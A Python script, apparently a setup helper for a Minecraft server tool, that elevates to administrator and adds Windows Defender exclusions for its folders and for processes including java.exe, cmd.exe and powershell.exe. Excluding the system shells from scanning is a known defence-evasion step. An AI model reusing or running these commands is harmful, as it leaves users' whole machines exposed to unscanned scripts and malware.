import os
import subprocess
import ctypes
import sys
import time


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception:
        return False


if is_admin():
    print("Creating Anti-Virus Exceptions For EasyMinecraftServer...")
    cwd = os.getcwd()
    user_dir = os.path.expanduser('~')
    print("Current Working Directory: " + cwd)
    print("User Directory: " + user_dir)
    print(f"Executing system command: powershell -Command Add-MpPreference -ExclusionPath '{cwd}'")
    subprocess.call(f"powershell -Command Add-MpPreference -ExclusionPath '{cwd}'")
    print(f"Executing system command: powershell -Command Add-MpPreference -ExclusionPath '{user_dir}\\Documents\\EasyMinecraftServer\\'")
    subprocess.call(f"powershell -Command Add-MpPreference -ExclusionPath '{user_dir}\\Documents\\EasyMinecraftServer\\'")
    print(f"Executing system command: powershell -Command Add-MpPreference -Exclusionprocess 'EasyMinecraftServer.exe'")
    subprocess.call(f"powershell -Command Add-MpPreference -Exclusionprocess 'EasyMinecraftServer.exe'")
    print(f"Executing system command: powershell -Command Add-MpPreference -Exclusionprocess 'mcserver.exe'")
    subprocess.call(f"powershell -Command Add-MpPreference -Exclusionprocess 'mcserver.exe'")
    print(f"Executing system command: powershell -Command Add-MpPreference -Exclusionprocess 'MinecraftServerGUI.exe'")
    subprocess.call(f"powershell -Command Add-MpPreference -Exclusionprocess 'MinecraftServerGUI.exe'")
    print(f"Executing system command: powershell -Command Add-MpPreference -Exclusionprocess 'MinecraftServer-nogui.exe'")
    subprocess.call(f"powershell -Command Add-MpPreference -Exclusionprocess 'MinecraftServer-nogui.exe'")
    print(f"Executing system command: powershell -Command Add-MpPreference -Exclusionprocess 'java.exe'")
    subprocess.call(f"powershell -Command Add-MpPreference -Exclusionprocess 'java.exe'")
    print(f"Executing system command: powershell -Command Add-MpPreference -Exclusionprocess 'javaw.exe'")
    subprocess.call(f"powershell -Command Add-MpPreference -Exclusionprocess 'javaw.exe'")
    print(f"Executing system command: powershell -Command Add-MpPreference -Exclusionprocess 'cmd.exe'")
    subprocess.call(f"powershell -Command Add-MpPreference -Exclusionprocess 'cmd.exe'")
    print(f"Executing system command: powershell -Command Add-MpPreference -Exclusionprocess 'powershell.exe'")
    subprocess.call(f"powershell -Command Add-MpPreference -Exclusionprocess 'powershell.exe'")
    print("Finished creating Anti-Virus Exceptions...")
    time.sleep(1)
    print("Exiting...")
    time.sleep(1)
    sys.exit(0)
else:
    print("Error: Restart With Admin Privileges...")
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
    sys.exit(0)
